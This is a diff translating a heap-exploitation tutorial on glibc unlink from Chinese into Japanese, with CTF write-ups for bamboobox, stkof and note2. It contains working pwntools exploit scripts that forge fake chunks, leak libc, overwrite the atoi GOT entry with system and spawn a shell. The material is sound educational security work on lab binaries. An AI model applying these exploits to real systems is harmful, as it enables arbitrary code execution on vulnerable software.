@@ -2,58 +2,58 @@
 
 ## 原理
 
-我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。
+unlink が引き起こす脆弱性を悪用するとき、実際には chunk のメモリレイアウトを組み立て、unlink の操作を利用してポインタを書き換える効果を得ます。
 
-我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下
+まず unlink の目的と流れを簡単におさらいします。その目的は、双方向リストの中から空きチャンクを取り出すことです(たとえば free のとき、物理的に隣接する free chunk と統合する場合など)。基本的な流れは次のとおりです。
 
 ![](./implementation/figure/unlink_smallbin_intro.png)
 
-下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。
+ここではまず、unlink に防御がなかった当初の攻撃方法を説明し、次に現在の unlink の攻撃方法を説明します。
 
-### 古老的 unlink
+### 古い unlink
 
-在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。
+unlink が最初に実装された当時は、チャンクの size の検査や双方向リストの検査は実はなく、次のような検査コードはありませんでした。
 
 ```c
-// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)
+// P はすでに双方向リストに入っているので、サイズが 2 か所に記録されている。そのためサイズが一致するかを検査する(size チェック)
 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
       malloc_printerr ("corrupted size vs. prev_size");			      \
-// 检查 fd 和 bk 指针(双向链表完整性检查)
+// fd と bk のポインタを検査する(双方向リストの整合性チェック)
 if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
   malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
 
-  // largebin 中 next_size 双向链表完整性检查 
+  // largebin の next_size の双方向リストの整合性チェック
               if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
               malloc_printerr (check_action,                                      \
                                "corrupted double-linked list (not small)",    \
                                P, AV);
 ```
-**这里我们以 32 位为例**，假设堆内存最初的布局是下面的样子
+**ここでは 32 ビットを例にします。**ヒープメモリの最初のレイアウトが次のようになっているとします。
 
 ![](./figure/old_unlink_vul.png)
 
-现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（**比如溢出**）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们free(Q)时
+いま、物理的に連続した 2 つのチャンク(Q、Nextchunk)があり、Q は使用中、Nextchunk は解放済みの状態だとします。何らかの方法(**たとえばオーバーフロー**)で Nextchunk の fd と bk のポインタを指定した値に書き換えたとします。すると free(Q) を行ったとき、次のようになります。
 
-- glibc 判断这个块是 small chunk
-- 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并
-- 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并
-- 继而对 Nextchunk 采取 unlink 操作
+- glibc はこのブロックが small chunk だと判断する
+- 前方への統合を判断し、前のチャンクが使用中なので、前方統合は不要と判断する
+- 後方への統合を判断し、後ろのチャンクが空きなので、統合が必要と判断する
+- 続いて Nextchunk に対して unlink の操作を行う
 
-那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下
+では unlink は具体的にどのような効果をもたらすのでしょうか。分析してみましょう。
 
 - FD=P->fd = target addr -12
 - BK=P->bk = expect value
-- FD->bk = BK，即 *(target addr-12+12)=BK=expect value
-- BK->fd = FD，即*(expect value +8) = FD = target addr-12
+- FD->bk = BK、つまり *(target addr-12+12)=BK=expect value
+- BK->fd = FD、つまり *(expect value +8) = FD = target addr-12
 
-**看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。**
+**一見すると unlink で任意アドレスの読み書きが直接実現できそうですが、expect value +8 のアドレスが書き込み可能であることを確認する必要があります。**
 
-比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。**需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。**
+たとえば target addr をある got のエントリに設定すると、プログラムが対応する libc 関数を呼び出したとき、設定した値(expect value)の位置にあるコードがそのまま実行されます。**expect value+8 の位置の値は破壊されるため、何とかして回避する必要があることに注意してください。**
 
-### 当前的 unlink
+### 現在の unlink
 
-**但是，现实是残酷的。。**我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查
+**しかし、現実は厳しいものです。**先ほどは検査がない場合を考えましたが、検査が加わるとそう簡単ではありません。fd と bk に対する検査を見てみましょう。
 
 ```c
 // fd bk
@@ -61,45 +61,45 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
   malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
 ```
 
-此时
+このとき
 
 - FD->bk = target addr - 12 + 12=target_addr
 - BK->fd = expect value + 8
 
-那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。
+となり、先ほどの GOT のエントリを書き換える方法は使えなくなる可能性があります。しかし、偽造によってこの仕組みを回避できます。
 
-首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要
+まず、上書きによって nextchunk の FD ポインタを fakeFD に、nextchunk の BK ポインタを fakeBK に向けます。このとき検証を通すには次が必要です。
 
 - `fakeFD -> bk == P`  <=>  `*(fakeFD + 12) == P`
 - `fakeBK -> fd == P`  <=>  `*(fakeBK + 8) == P`
 
-当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：
+上の 2 つの式を満たすと Unlink の処理に進み、次の操作が行われます。
 
 - `fakeFD -> bk = fakeBK`  <=>  `*(fakeFD + 12) = fakeBK`
 - `fakeBK -> fd = fakeFD`  <=>  `*(fakeBK + 8) = fakeFD`
 
-如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向P的指针，那么：
+fakeFD + 12 と fakeBK + 8 が、P を指す同じポインタを指すようにすると、次のようになります。
 
 - `*P = P - 8`
 - `*P = P - 12`
 
-即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。
+つまりこの方法により、P のポインタは自分より 12 低いアドレスを指すようになります。この方法では任意アドレス書き込みはできませんが、チャンクを指すポインタを書き換えられ、そのような書き換えでも一定の効果が得られます。
 
-如果我们想要使得两者都指向 P，只需要按照如下方式修改即可
+両方が P を指すようにしたい場合は、次のように書き換えるだけです。
 
 ![](./figure/new_unlink_vul.png)
 
-需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。
+ここで、次の制約には違反していないことに注意してください。Unlink の前の P は正しいチャンクを指すポインタだからです。
 
 ```c
-    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
+    // P はすでに双方向リストに入っているので、サイズが 2 か所に記録されている。そのためサイズが一致するかを検査する。
     if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
       malloc_printerr ("corrupted size vs. prev_size");			      \
 ```
 
-**此外，其实如果我们设置next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。**
+**また、next chunk の fd と bk をどちらも nextchunk 自身のアドレスに設定しても、上の検査を回避できます。ただしその場合、ポインタの内容を書き換える効果は得られません。**
 
-同时需要注意的是，在比较新的glibc版本中，`unlink_chunk` 在针对large bins时候，有对于两个`*_nextsize`指针的检查
+なお、比較的新しい glibc では、`unlink_chunk` が large bins を対象とするとき、2 つの `*_nextsize` ポインタに対する検査があることに注意してください。
 
 ```c
 if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
@@ -111,33 +111,33 @@ if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
   }
 ```
 
-这意味着，当**伪造的 chunk 在 large bin 范围内**的时候，我们需要**将 `bk_next_size` 设为 NULL** 来绕过对于链表完整性的检查。
+つまり、**偽造したチャンクが large bin の範囲内にある**場合は、リストの整合性チェックを回避するために **`bk_next_size` を NULL に設定**する必要があります。
 
-## 利用思路
+## 攻撃の考え方
 
 ### 条件
 
-1. 可进行 UAF 的 chunk；可修改 free 状态下 smallbin，large bin 或是 unsorted bin 的 fd 和 bk 指针
-2. 已知位置存在一个指针指向可进行 UAF 的 chunk
+1. UAF を起こせるチャンクがあること。解放状態の smallbin、large bin、または unsorted bin の fd と bk のポインタを書き換えられること
+2. 既知の位置に、UAF を起こせるチャンクを指すポインタが存在すること
 
-### 效果
+### 効果
  
-使 ptr 处，原本指向 UAF chunk 的指针变为 ptr - 0x18
+ptr の位置にある、本来 UAF チャンクを指していたポインタが ptr - 0x18 になります。
 
-### 思路
+### 手順
 
-设指向可 UAF chunk 的指针的地址为 ptr
+UAF を起こせるチャンクを指すポインタのアドレスを ptr とします。
 
-1. 修改 fd 为 ptr - 0x18
-2. 修改 bk 为 ptr - 0x10
-3. 触发 unlink
+1. fd を ptr - 0x18 に書き換える
+2. bk を ptr - 0x10 に書き換える
+3. unlink を発動させる
 
-ptr 处的指针会变为 ptr - 0x18。
+ptr の位置のポインタは ptr - 0x18 になります。
 
 ## HITCON Training Lab11: bamboobox
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/bamboofox)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/bamboofox)
 
-### 基本信息
+### 基本情報
 ```shell
 # zer0ptr @ zer0ptr-MateBook-D14 in ~/HITCON-Training/LAB/lab11 on git:master x [13:31:17]
 $ file bamboobox
@@ -152,41 +152,41 @@ NX:        NX enabled
 PIE:       No PIE
 Stripped:  No
 ```
-四个函数，分别对应`show()`, `add()`, `change()`, `free()`
+4 つの関数があり、それぞれ `show()`、`add()`、`change()`、`free()` に対応します。
 
-### 堆布局
+### ヒープレイアウト
 
-#### 分配chunk
+#### チャンクの確保
 ```python
-additem(0x40, b"a"*8)   # chunk0 - 存放 fake chunk 的容器
-additem(0x80, b"b"*8)   # chunk1 - 将被 free 触发 unlink
-additem(0x40, b"c"*8)   # chunk2 - 隔离层，防止合并到 top chunk
+additem(0x40, b"a"*8)   # chunk0 - fake chunk を入れる容器
+additem(0x80, b"b"*8)   # chunk1 - free して unlink を発動させる
+additem(0x40, b"c"*8)   # chunk2 - 隔離用。top chunk への統合を防ぐ
 ```
-此时内存布局如下：
+このときのメモリレイアウトは次のとおりです。
 ```text
 低地址                                   高地址
 [chunk0: 0x50] [chunk1: 0x90] [chunk2: 0x50] [top chunk]
 ```
 
-#### 构造fake chunk
+#### fake chunk の構築
 ```python
-ptr = 0x6020c8  # chunk0 指针的存储位置
+ptr = 0x6020c8  # chunk0 のポインタの格納位置
 
-fake_chunk = p64(0)                    # fake chunk 的 prev_size
-fake_chunk += p64(0x41)                # fake chunk 的 size (0x40 + 1)
-fake_chunk += p64(ptr - 0x18)          # fd 指向 &global[2]-0x18
-fake_chunk += p64(ptr - 0x10)          # bk 指向 &global[2]-0x10
-fake_chunk += b"c" * 0x20              # 填充到 chunk0 数据区末尾
-fake_chunk += p64(0x40)                # 覆盖 chunk1.prev_size = 0x40
-fake_chunk += p64(0x90)                # 覆盖 chunk1.size，清除 PREV_INUSE 位
+fake_chunk = p64(0)                    # fake chunk の prev_size
+fake_chunk += p64(0x41)                # fake chunk の size (0x40 + 1)
+fake_chunk += p64(ptr - 0x18)          # fd は &global[2]-0x18 を指す
+fake_chunk += p64(ptr - 0x10)          # bk は &global[2]-0x10 を指す
+fake_chunk += b"c" * 0x20              # chunk0 のデータ領域の末尾まで埋める
+fake_chunk += p64(0x40)                # chunk1.prev_size = 0x40 を上書き
+fake_chunk += p64(0x90)                # chunk1.size を上書きし、PREV_INUSE ビットを落とす
 ```
 
 #### unlink
 ```python
-change(0, 0x80, fake_chunk)   # 编辑 chunk0，覆盖 chunk1 的 header
-remove(1)                      # free chunk1，触发 unlink
+change(0, 0x80, fake_chunk)   # chunk0 を編集し、chunk1 のヘッダを上書きする
+remove(1)                      # chunk1 を free して unlink を発動させる
 ```
-此时就执行 `unlink fake_chunk`，global[2] 指针被修改为 &global[2]-0x18 (0x6020b0)
+これで `unlink fake_chunk` が実行され、global[2] のポインタが &global[2]-0x18 (0x6020b0) に書き換えられます。
 
 #### leak
 ```python
@@ -211,7 +211,7 @@ r.sendline(b"/bin/sh\x00")
 r.interactive()                   
 ```
 
-完整的exp如下：
+完全な exp は次のとおりです。
 ```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
@@ -252,76 +252,76 @@ def show():
     r.recvuntil(b":")
     r.sendline(b"1")
 
-# ========== Step 1: 分配堆块 ==========
+# ========== Step 1: チャンクの確保 ==========
 print("[*] Step 1: Allocating chunks...")
 additem(0x40, b"a"*8)   # chunk 0
 additem(0x80, b"b"*8)   # chunk 1
 additem(0x40, b"c"*8)   # chunk 2
 
-# ========== Step 2: 构造 fake chunk ==========
+# ========== Step 2: fake chunk の構築 ==========
 print("[*] Step 2: Constructing fake chunk...")
-ptr = 0x6020c8  # chunk0 指针的存储位置
+ptr = 0x6020c8  # chunk0 のポインタの格納位置
 
-# 构造 fake chunk
+# fake chunk を構築する
 fake_chunk = p64(0)                    # prev_size
 fake_chunk += p64(0x41)                # size (0x40 + 0x1, PREV_INUSE=1)
 fake_chunk += p64(ptr - 0x18)          # fd
 fake_chunk += p64(ptr - 0x10)          # bk
-fake_chunk += b"c" * 0x20              # 填充到 chunk0 数据区末尾
-fake_chunk += p64(0x40)                # 覆盖 chunk1 的 prev_size
-fake_chunk += p64(0x90)                # 覆盖 chunk1 的 size (清除 PREV_INUSE 位)
+fake_chunk += b"c" * 0x20              # chunk0 のデータ領域の末尾まで埋める
+fake_chunk += p64(0x40)                # chunk1 の prev_size を上書き
+fake_chunk += p64(0x90)                # chunk1 の size を上書き (PREV_INUSE ビットを落とす)
 
 print("[*] Step 3: Triggering overflow and unlink...")
 change(0, 0x80, fake_chunk)
-remove(1)  # 触发 unlink
+remove(1)  # unlink を発動させる
 
-# ========== Step 3: 利用 unlink 后的任意地址写 ==========
+# ========== Step 3: unlink 後の任意アドレス書き込みを利用 ==========
 print("[*] Step 4: Exploiting arbitrary write...")
 
-# 此时 chunk0 的指针指向 ptr-24 (0x6020b0)
-# 构造 payload 将 chunk0 指针改为指向 atoi 的 GOT
+# このとき chunk0 のポインタは ptr-24 (0x6020b0) を指す
+# payload を構築し、chunk0 のポインタを atoi の GOT を指すように変更する
 atoi_got = elf.got['atoi']
 payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)
 change(0, 0x80, payload)
 
-# ========== Step 4: 泄露 atoi 地址 ==========
+# ========== Step 4: atoi のアドレスをリーク ==========
 print("[*] Step 5: Leaking atoi address...")
 show()
 
-# 接收泄露的地址
+# リークしたアドレスを受信する
 r.recvuntil(b"0 : ")
-leak_data = r.recvuntil(b":")[:6]  # 接收6个字节
+leak_data = r.recvuntil(b":")[:6]  # 6 バイトを受信
 atoi_addr = u64(leak_data.ljust(8, b"\x00"))
 print(f"[+] Leaked atoi address: {hex(atoi_addr)}")
 
-# ========== Step 5: 使用 LibcSearcher 确定 libc 版本 ==========
+# ========== Step 5: LibcSearcher で libc のバージョンを特定 ==========
 print("[*] Step 6: Searching libc version...")
 libc = LibcSearcher('atoi', atoi_addr)
 
-# 获取 libc 基址
+# libc のベースアドレスを取得
 libc_base = atoi_addr - libc.dump('atoi')
 print(f"[+] libc base: {hex(libc_base)}")
 
-# 获取 system 地址
+# system のアドレスを取得
 system_addr = libc_base + libc.dump('system')
 print(f"[+] system address: {hex(system_addr)}")
 
-# 获取 /bin/sh 地址
+# /bin/sh のアドレスを取得
 binsh_addr = libc_base + libc.dump('str_bin_sh')
 print(f"[+] /bin/sh address: {hex(binsh_addr)}")
 
-# 可选：获取 one_gadget (libc-2.23 常见偏移)
+# 任意: one_gadget を取得 (libc-2.23 の一般的なオフセット)
 one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
 for og in one_gadgets:
     print(f"[+] possible one_gadget: {hex(libc_base + og)}")
 
-# ========== Step 6: 劫持控制流 ==========
+# ========== Step 6: 制御フローのハイジャック ==========
 print("[*] Step 7: Hijacking control flow...")
 
-# 修改 atoi 的 GOT 为 system
+# atoi の GOT を system に書き換える
 change(0, 0x8, p64(system_addr))
 
-# 触发 system('/bin/sh')
+# system('/bin/sh') を発動させる
 r.recvuntil(b":")
 r.sendline(b"/bin/sh\x00")
 r.interactive()
@@ -329,9 +329,9 @@ r.interactive()
 
 ## 2014 HITCON stkof
 
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2014_hitcon_stkof)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2014_hitcon_stkof)
 
-### 基本信息
+### 基本情報
 
 ```shell
 ➜  2014_hitcon_stkof git:(master) file stkof
@@ -345,22 +345,22 @@ stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
     PIE:      No PIE (0x400000)
 ```
 
-可以看出，程序是 64 位的，主要开启了 Canary 和 NX 保护。
+プログラムは 64 ビットで、主に Canary と NX が有効になっています。
 
-### 基本功能
+### 基本機能
 
-程序存在 4 个功能，经过 IDA 分析后可以分析功能如下
+プログラムには 4 つの機能があり、IDA で解析すると次のとおりです。
 
-- alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global
-- read_in：根据指定索引，向分配的内存处读入数据，数据长度可控，**这里存在堆溢出的情况**
-- free：根据指定索引，释放已经分配的内存块
-- useless：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出
+- alloc: size を入力し、size 大のメモリを確保して、対応するチャンクのポインタを bss セグメントに記録します(これを global とします)
+- read_in: 指定したインデックスに従い、確保したメモリにデータを読み込みます。データ長は制御可能で、**ここにヒープオーバーフローがあります**
+- free: 指定したインデックスに従い、確保済みのメモリブロックを解放します
+- useless: この機能は役に立ちません。内容を出力できるのかと思いましたが、何も出力されませんでした
 
-### IO 缓冲区问题分析
+### IO バッファの問題の分析
 
-值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看
+注目すべきことに、プログラム自体が setbuf の操作を行っていないため、入出力を実行するときにバッファが確保されます。テストした結果、2 つのバッファが確保され、サイズはそれぞれ 1024 と 1024 です。具体的には次のとおりで、デバッグして確認できます。
 
-初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。
+最初に fgets を呼び出すとき、malloc は 1024 サイズのバッファを確保します。
 
 ```
 *RAX  0x0
@@ -395,7 +395,7 @@ stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, 
    f 9     7ffff7a2d830 __libc_start_main+240
 ```
 
-分配之后，堆如下
+確保した後のヒープは次のとおりです。
 
 ```
 pwndbg> heap
@@ -420,7 +420,7 @@ Last Remainder: 0
 }
 ```
 
-当分配16大小的内存后，堆布局如下
+サイズ 16 のメモリを確保した後のヒープレイアウトは次のとおりです。
 
 ```
 pwndbg> heap
@@ -453,7 +453,7 @@ Last Remainder: 0
 }
 ```
 
-当使用 printf 函数，会分配 1024 字节空间，如下
+printf 関数を使うと、次のように 1024 バイトの領域が確保されます。
 
 ```
 *RAX  0x0
@@ -489,7 +489,7 @@ Last Remainder: 0
 
 ```
 
-堆布局如下
+ヒープレイアウトは次のとおりです。
 
 ```
 pwndbg> heap
@@ -530,9 +530,9 @@ Last Remainder: 0
 }
 ```
 
-此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。
+これ以降は、入力でも出力でもバッファは確保されません。そのため、最初にチャンクを 1 つ確保してこれらのバッファを先に確保させておくと、その後の操作が楽になります。
 
-但是，比较有意思的是，如果我们是 attach 上去的话，第一个缓冲区分配的大小为 4096 大小。
+ただし興味深いことに、attach した場合は、最初のバッファの確保サイズは 4096 になります。
 
 ```
 pwndbg> heap
@@ -558,19 +558,19 @@ Last Remainder: 0
 
 ```
 
-### 基本思路
+### 基本的な方針
 
-根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。
+以上の分析から、最初にチャンクを 1 つ確保してバッファの確保を済ませ、その後の操作に影響しないようにします。
 
-由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下
+プログラム自体に leak がないため、system などの関数を実行するには、まず leak を作ることが第一の目的になります。基本的な方針は次のとおりです。
 
-- 利用 unlink 修改 global[2] 为 &global[2]-0x18。
-- 利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 atoi@got 地址。
-- 修改 `free@got` 为 `puts@plt` 的地址，从而当再次调用 `free` 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。
-- free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。
-- 修改 `atoi@got` 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。
+- unlink を利用して global[2] を &global[2]-0x18 に書き換える。
+- 編集機能を利用して global[0] を free@got のアドレスに、global[1] を puts@got のアドレスに、global[2] を atoi@got のアドレスに書き換える。
+- `free@got` を `puts@plt` のアドレスに書き換える。これにより、再び `free` 関数を呼び出すと puts 関数が直接呼び出され、関数の内容をリークできる。
+- global[1] を free する。つまり puts@got の内容をリークし、それによって system 関数のアドレスと libc 内の /bin/sh のアドレスがわかる。
+- `atoi@got` を system 関数のアドレスに書き換え、再び呼び出すときに /bin/sh のアドレスを入力すればよい。
 
-代码如下
+コードは次のとおりです。
 
 ```python
 context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
@@ -666,23 +666,23 @@ if __name__ == "__main__":
 ```
 
 ## 2016 ZCTF note2
-[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2016_zctf_note2)
+[問題へのリンク](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2016_zctf_note2)
 
-### 分析程序
+### プログラムの分析
 
-首先，我们先分析一下程序，可以看出程序的主要功能为
+まずプログラムを分析します。プログラムの主な機能は次のとおりです。
 
-- 添加note，size限制为0x80，size会被记录，note指针会被记录。
-- 展示note内容。
-- 编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。
-- 释放note。
+- note の追加。size の上限は 0x80 で、size が記録され、note のポインタも記録されます。
+- note の内容の表示。
+- note の内容の編集。既存の note の上書きと、既存の note の後ろへの追記があります。
+- note の解放。
 
-仔细分析后，可以发现程序有以下几个问题
+詳しく分析すると、プログラムには次のような問題があることがわかります。
 
-1. 在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入size为0时，glibc根据其规定，会分配0x20个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。
-2. 程序在每次编辑note时，都会申请0xa0大小的内存，但是在 free 之后并没有设置为NULL。
+1. note を追加するとき、プログラムは note に対応するサイズを記録し、そのサイズが note の内容を読み込む量の制御に使われます。しかし読み込みのループ変数 i は符号なし変数なので、比較時にはすべて符号なしに変換されます。size に 0 を入力すると、glibc の規定により 0x20 バイトが確保されますが、プログラムが読み込む内容には制限がないため、ヒープオーバーフローが発生します。
+2. プログラムは note を編集するたびに 0xa0 サイズのメモリを確保しますが、free の後に NULL を設定していません。
 
-第一个问题对应在ida中的代码如下
+1 つ目の問題に対応する IDA 上のコードは次のとおりです。
 
 ```c
 unsigned __int64 __fastcall ReadLenChar(__int64 a1, __int64 a2, char a3)
@@ -707,17 +707,17 @@ unsigned __int64 __fastcall ReadLenChar(__int64 a1, __int64 a2, char a3)
 }
 ```
 
-其中i是unsigned类型，a2为int类型，所以两者在for循环相比较的时候，a2-1的结果-1会被视为unsigned类型，此时，即最大的整数。所以说可以读取任意长度的数据，这里也就是后面我们溢出所使用的办法。
+ここで i は unsigned 型、a2 は int 型なので、両者を for ループで比較するとき、a2-1 の結果である -1 は unsigned 型として扱われ、最大の整数になります。したがって任意の長さのデータを読み込めます。これが後でオーバーフローに使う方法です。
 
-### 基本思路
+### 基本的な方針
 
-这里我们主要利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。
+ここでは主に最初に見つけた問題を利用し、fastbin の仕組みと unlink の仕組みを使います。
 
-下面依次进行讲解。
+以下、順に説明します。
 
 #### 基本操作
 
-首先，我们先把note可能的基本操作列举出来。
+まず、note に対して可能な基本操作を挙げておきます。
 
 ```python
 p = process('./note2')
@@ -759,9 +759,9 @@ def deletenote(id):
     p.sendline(str(id))
 ```
 
-#### 生成三个note
+#### 3 つの note の生成
 
-构造三个 chunk，chunk0、chunk1 和 chunk2
+3 つのチャンク、chunk0、chunk1、chunk2 を構築します。
 
 ```python
 # chunk0: a fake chunk
@@ -777,20 +777,20 @@ newnote(0, 'a' * 8)
 newnote(0x80, 'b' * 16)
 ```
 
-其中这三个 chunk 申请时的大小分别为0x80，0，0x80，chunk1 虽然申请的大小为0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段(prev\_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该note输入任意长的字符串。
+この 3 つのチャンクを確保するときのサイズはそれぞれ 0x80、0、0x80 です。chunk1 は確保サイズが 0 ですが、glibc ではチャンクブロックが少なくとも 4 つの必須フィールド(prev\_size、size、fd、bk)を格納できる必要があるため、0x20 の領域が確保されます。また、符号なし整数の比較の問題により、この note には任意の長さの文字列を入力できます。
 
-这里需要注意的是，chunk0 中一共构造了两个 chunk
+ここで、chunk0 の中に合計 2 つのチャンクを構築していることに注意してください。
 
-- chunk ptr[0]，这个是为了 unlink 时修改对应的值。
-- chunk ptr[0]'s nextchunk，这个是为了使得 unlink 时的第一个检查满足。
+- chunk ptr[0]。unlink のときに対応する値を書き換えるためのものです。
+- chunk ptr[0]'s nextchunk。unlink 時の最初の検査を満たすためのものです。
 
 ```c
-    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
+    // P はすでに双方向リストに入っているので、サイズが 2 か所に記録されている。そのためサイズが一致するかを検査する。
     if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
       malloc_printerr ("corrupted size vs. prev_size");			      \
 ```
 
-当构造完三个 note 后，堆的基本构造如图1所示。
+3 つの note を構築し終えたときのヒープの基本構造は図 1 のようになります。
 
 ```
                                    +-----------------+ high addr
@@ -831,9 +831,9 @@ fake ptr[0] chunk's nextchunk----->+-----------------+
                                            图1
 ```
 
-#### 释放 chunk1-覆盖 chunk2-释放 chunk2
+#### chunk1 の解放、chunk2 の上書き、chunk2 の解放
 
-对应的代码如下
+対応するコードは次のとおりです。
 
 ```python
 # edit the chunk1 to overwrite the chunk2
@@ -845,7 +845,7 @@ newnote(0, content)
 deletenote(2)
 ```
 
-首先释放 chunk1，由于该chunk属于fastbin，所以下次在申请的时候仍然会申请到该chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖chunk2，覆盖之后如图2所示。
+まず chunk1 を解放します。このチャンクは fastbin に属するため、次に確保するときにも同じチャンクが確保されます。また、上述の型の問題により任意の文字を読み込めるので、chunk2 を上書きできます。上書き後は図 2 のようになります。
 
 ```
                                    +-----------------+high addr
@@ -886,17 +886,17 @@ fake ptr[0] chunk's nextchunk----->+-----------------+
                                            图2
 ```
 
-该覆盖主要是为了释放chunk2的时候可以后向合并（合并低地址），对chunk0中虚拟构造的chunk进行unlink。即将要执行的操作为unlink(ptr[0])，同时我们所构造的fakebk和fakefd满足如下约束
+この上書きは主に、chunk2 を解放するときに後方統合(低アドレス側との統合)を起こさせ、chunk0 の中に仮に構築したチャンクに対して unlink を行わせるためのものです。これから実行される操作は unlink(ptr[0]) で、構築した fakebk と fakefd は次の制約を満たします。
 
 ```c
     if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 ```
 
-unlink成功执行，会导致ptr[0]所存储的地址变为fakebk，即ptr-0x18。
+unlink が成功すると、ptr[0] に格納されているアドレスが fakebk、つまり ptr-0x18 になります。
 
-#### 获取system地址
+#### system のアドレスの取得
 
-代码如下
+コードは次のとおりです。
 
 ```python
 # overwrite the chunk0(which is ptr[0]) with got atoi
@@ -921,12 +921,12 @@ system_addr = libcbase + system_offest
 print 'leak system addr: ', hex(system_addr)
 ```
 
-我们修改ptr[0]的内容为 ptr 的地址-0x18，所以当我们再次编辑 note0 时，可以覆盖ptr[0]的内容。这里我们将其覆盖为atoi的地址。
-这样的话，如果我们查看note 0的内容，其实查看的就是atoi的地址。
+ptr[0] の内容を ptr のアドレス-0x18 に書き換えたので、再び note0 を編集すると ptr[0] の内容を上書きできます。ここではそれを atoi のアドレスで上書きします。
+こうすると、note 0 の内容を表示すれば、実際に表示されるのは atoi のアドレスです。
 
-之后我们根据 libc 中对应的偏移计算出 system 的地址。
+その後、libc 内の対応するオフセットから system のアドレスを計算します。
 
-#### 修改atoi got
+#### atoi の got の書き換え
 
 ```python
 # overwrite the atoi got with systemaddr
@@ -934,7 +934,7 @@ content = p64(system_addr)
 editnote(0, 1, content)
 ```
 
